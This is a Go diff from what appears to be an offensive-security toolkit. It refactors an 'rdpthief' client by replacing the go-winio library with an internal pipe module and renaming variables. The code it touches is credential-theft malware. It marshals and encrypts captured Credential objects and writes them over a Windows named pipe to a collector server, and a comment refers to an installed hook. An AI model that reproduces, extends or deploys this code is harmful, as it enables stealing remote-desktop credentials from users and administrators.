@@ -9,10 +9,9 @@ import (
 	"sync"
 	"time"
 
-	"github.com/Microsoft/go-winio"
-
 	"project/internal/convert"
 	"project/internal/crypto/aes"
+	"project/internal/module/windows/pipe"
 	"project/internal/patch/msgpack"
 	"project/internal/xpanic"
 )
@@ -87,11 +86,11 @@ func (client *Client) sendCredLoop() {
 func (client *Client) sendCred(cred *Credential) {
 	// connect to the rdpthief server
 	var (
-		pipe net.Conn
+		conn net.Conn
 		err  error
 	)
 	for {
-		pipe, err = client.connect()
+		conn, err = client.connect()
 		if err == nil {
 			break
 		}
@@ -101,7 +100,7 @@ func (client *Client) sendCred(cred *Credential) {
 			return
 		}
 	}
-	defer func() { _ = pipe.Close() }()
+	defer func() { _ = conn.Close() }()
 	// send credential
 	data, err := msgpack.Marshal(cred)
 	if err != nil {
@@ -111,15 +110,15 @@ func (client *Client) sendCred(cred *Credential) {
 	if err != nil {
 		return
 	}
-	_ = pipe.SetWriteDeadline(time.Now().Add(10 * time.Second))
-	_, _ = pipe.Write(convert.BEUint32ToBytes(uint32(len(enc))))
-	_, _ = pipe.Write(enc)
+	_ = conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+	_, _ = conn.Write(convert.BEUint32ToBytes(uint32(len(enc))))
+	_, _ = conn.Write(enc)
 }
 
 func (client *Client) connect() (net.Conn, error) {
 	ctx, cancel := context.WithTimeout(client.ctx, 10*time.Second)
 	defer cancel()
-	return winio.DialPipeContext(ctx, `\\.\pipe\`+client.pipeName)
+	return pipe.DialContext(ctx, `\\.\pipe\`+client.pipeName)
 }
 
 // Close is used to close client, it will uninstall hook.
